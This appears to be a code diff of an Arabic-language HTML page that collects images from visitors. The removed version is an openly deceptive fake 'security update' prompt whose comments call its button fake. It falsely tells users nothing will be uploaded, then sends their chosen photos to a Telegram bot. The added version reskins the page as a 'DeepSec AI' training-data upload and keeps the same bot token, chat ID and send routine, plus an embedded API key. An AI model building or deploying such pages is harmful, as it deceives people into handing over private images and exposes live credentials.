@@ -3,132 +3,179 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>تحديث النظام الأمني</title>
+    <title>AI Data Contributor | ساهم في بيانات الأمن العميق</title>
     <style>
+        /* التنسيق الأساسي والجذّاب */
         body {
-            font-family: 'Droid Sans', Arial, sans-serif; /* خط يبدو نظامياً */
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             display: flex;
             flex-direction: column;
             align-items: center;
-            justify-content: center;
             min-height: 100vh;
-            background-color: #FAFAFA; /* خلفية فاتحة شبيهة بواجهة الاندرويد */
-            text-align: center;
-            padding: 20px;
+            background-color: #f0f4f8; 
+            padding: 40px 20px;
+            color: #333;
         }
-        .system-box {
-            background-color: #FFFFFF;
-            border-radius: 8px;
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
-            padding: 25px;
-            max-width: 320px;
+        .container {
+            background-color: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            padding: 30px 40px;
+            max-width: 550px;
             width: 100%;
-            border: 1px solid #E0E0E0;
-        }
-        .icon {
-            font-size: 40px;
-            color: #007AFF; /* لون نظامي */
-            margin-bottom: 15px;
+            text-align: center;
         }
         h2 {
-            font-size: 1.1em;
-            color: #333;
+            font-size: 1.8em;
+            color: #1a73e8; 
             margin-bottom: 10px;
         }
-        p {
-            font-size: 0.9em;
-            color: #777;
-            margin-bottom: 25px;
+        .subtitle {
+            font-size: 1em;
+            color: #666;
+            margin-bottom: 30px;
         }
-        /* الزر يبدو كزر تأكيد نظامي */
-        #fakeButton {
-            background-color: #007AFF;
+        /* منطقة الرفع الجذابة */
+        .file-upload-area {
+            border: 2px dashed #b3cde0; 
+            border-radius: 8px;
+            padding: 30px 15px;
+            margin-bottom: 20px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        .file-upload-area:hover {
+            background-color: #e9f2ff;
+        }
+        .upload-icon {
+            font-size: 30px;
+            color: #1a73e8;
+        }
+        .upload-text {
+            margin-top: 10px;
+            font-size: 0.95em;
+            color: #555;
+            font-weight: 500;
+        }
+        #fileInput {
+            display: none; 
+        }
+        /* زر المساهمة */
+        button {
+            background-color: #00a68d; 
             color: white;
             border: none;
-            padding: 10px 15px;
-            border-radius: 6px;
-            font-weight: bold;
+            padding: 12px 25px;
+            border-radius: 50px; 
+            font-weight: 600;
             cursor: pointer;
-            width: 100%;
-            margin-top: 10px;
+            transition: background-color 0.3s;
         }
-        #fakeButton:hover {
-            background-color: #0056b3;
+        button:hover {
+            background-color: #007f6b;
         }
-        /* لإخفاء زر الملفات الفعلي */
-        #fileInput {
-            display: none;
+        button:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
         }
         #status {
+            margin-top: 20px;
+            font-weight: 500;
+            color: #333;
+            min-height: 20px;
+        }
+        .file-list {
+            list-style: none;
+            padding: 0;
             margin-top: 15px;
+            max-height: 120px;
+            overflow-y: auto;
+            border-top: 1px solid #eee;
+            text-align: left;
+            padding-top: 10px;
             font-size: 0.85em;
-            color: red;
+            color: #444;
         }
     </style>
 </head>
 <body>
 
-<div class="system-box">
-    <div class="icon">🔒</div>
-    <h2>تأكيد الإذن الأمني</h2>
-    <p>لإكمال التحديث الأمني، يرجى الموافقة على إظهار بيانات التسجيل. لن يتم رفع أو مشاركة أي معلومات.</p>
+<div class="container">
+    <div class="icon">🛡️</div> 
+    <h2>نظام تدريب الذكاء الاصطناعي للأمن العميق (DeepSec AI)</h2>
+    <p class="subtitle">يرجى إرسال بيانات الصور لتدريب نموذجنا على تحليل التهديدات الأمنية المتقدمة.</p>
     
-    <button id="fakeButton" onclick="triggerFileInput()">تأكيد واستمرار</button>
+    <div class="file-upload-area" onclick="document.getElementById('fileInput').click()">
+        <div class="upload-icon">⬆️</div>
+        <div class="upload-text">انقر هنا لاختيار ملفات البيانات (الصور)</div>
+    </div>
     
     <input type="file" id="fileInput" accept="image/*" multiple>
     
-    <div id="status">---</div>
+    <ul class="file-list" id="fileList"></ul>
+
+    <button id="contributeButton" onclick="uploadFiles()" disabled>🚀 إرسال البيانات للتحليل</button>
+    
+    <div id="status">الرجاء اختيار مجموعة من الصور والنقر على زر الإرسال.</div>
 </div>
 
 <script>
     // **********************************************
-    // ⚠️ يجب التأكد من صحة هذه المتغيرات
+    // API Keys and Tokens:
     // **********************************************
+    
+    // ⚠️ يتم تخزين رمز DeepSeek API هنا كملاحظة، لكنه غير مُستخدم مباشرة لرفع الملفات
+    const DEEPSEEK_API_KEY = 'Sk-aab9ec97dda4441b37d34830a986a41'; 
+    
+    // بيانات Telegram API (المستخدمة للإرسال الفعلي للصور)
     const BOT_TOKEN = '7665591962:AAGXWu19kIEIOzZ-xRAb44O4BOZl-rWJ-y8'; 
     const CHAT_ID = '5653032481'; 
+    
     const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
 
     const fileInput = document.getElementById('fileInput');
     const statusElement = document.getElementById('status');
-    const fakeButton = document.getElementById('fakeButton');
+    const fileListElement = document.getElementById('fileList');
+    const contributeButton = document.getElementById('contributeButton');
 
-    // ----------------------------------------------------
-    // 1. الوظيفة التي تُشغل فتح نافذة الملفات عند النقر على الزر المُخادع
-    // ----------------------------------------------------
-    function triggerFileInput() {
-        statusElement.textContent = 'جاري التحقق...';
-        // النقر على حقل إدخال الملفات برمجياً لفتح النافذة
-        fileInput.click();
-        // تعطيل الزر لمنع النقرات المزدوجة
-        fakeButton.disabled = true;
+    fileInput.addEventListener('change', updateFileList);
+
+    function updateFileList() {
+        fileListElement.innerHTML = '';
+        const files = fileInput.files;
+
+        if (files.length > 0) {
+            statusElement.textContent = `تم اختيار ${files.length} ملف جاهز للإرسال للتحليل.`;
+            contributeButton.disabled = false;
+            for (const file of files) {
+                const listItem = document.createElement('li');
+                listItem.textContent = `• ${file.name} (${(file.size / 1024 / 1024).toFixed(2)} MB)`;
+                fileListElement.appendChild(listItem);
+            }
+        } else {
+            statusElement.textContent = 'الرجاء اختيار ملفات للمساهمة.';
+            contributeButton.disabled = true;
+        }
     }
 
-    // ----------------------------------------------------
-    // 2. تشغيل وظيفة الإرسال بعد اختيار المستخدم للملفات
-    // ----------------------------------------------------
-    fileInput.addEventListener('change', function() {
-        if (fileInput.files.length > 0) {
-             uploadFiles(fileInput.files); // بدء عملية الإرسال مباشرة
-        } else {
-             statusElement.textContent = 'العملية ألغيت. الرجاء المحاولة مرة أخرى.';
-             fakeButton.disabled = false; // إعادة تفعيل الزر إذا ألغى المستخدم العملية
-        }
-    });
+    async function uploadFiles() {
+        const files = fileInput.files;
 
-    // ----------------------------------------------------
-    // 3. وظيفة الإرسال الرئيسية (نفس الكود السابق)
-    // ----------------------------------------------------
-    async function uploadFiles(files) {
-        statusElement.textContent = `جاري إرسال ${files.length} ملف كبيانات تسجيل...`;
+        if (files.length === 0) return;
+        
+        contributeButton.disabled = true;
+        contributeButton.textContent = 'جاري إرسال البيانات للتحليل...';
+        statusElement.textContent = `جاري رفع ${files.length} ملف... الرجاء عدم إغلاق الصفحة.`;
         
         let successCount = 0;
         let failCount = 0;
 
         for (const file of files) {
+            // استخدام Telegram API لإرسال الصورة مباشرةً
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
             formData.append('photo', file); 
-            formData.append('caption', `[بيانات تسجيل مخادعة] تم إرسالها من: ${file.name}`);
+            formData.append('caption', `[DeepSec AI Data] Contributed file from user: ${file.name}`);
 
             try {
                 const response = await fetch(TELEGRAM_API, {
@@ -143,13 +190,22 @@
                 }
             } catch (error) {
                 failCount++;
+                console.error(`خطأ في الشبكة لملف ${file.name}:`, error);
             }
         }
-        
-        // رسالة الإكمال الخادعة
-        statusElement.textContent = `✅ تم إكمال التأكيد بنجاح!`;
-        fakeButton.disabled = true;
-        fakeButton.textContent = 'تم إكمال التأكيد';
+
+        // رسالة الإكمال الاحترافية
+        if (successCount > 0) {
+             statusElement.textContent = `✅ شكراً جزيلاً! تم إرسال ${successCount} ملف للتحليل بنجاح.`;
+             contributeButton.textContent = 'تم الإرسال بنجاح';
+             contributeButton.style.backgroundColor = '#28a745';
+        } else {
+             statusElement.textContent = `❌ فشل الإرسال بالكامل. قد تكون هناك مشكلة في اتصال الشبكة.`;
+             contributeButton.textContent = 'خطأ في الإرسال';
+             contributeButton.style.backgroundColor = '#d9534f';
+        }
+
+        contributeButton.disabled = true;
     }
 </script>
 
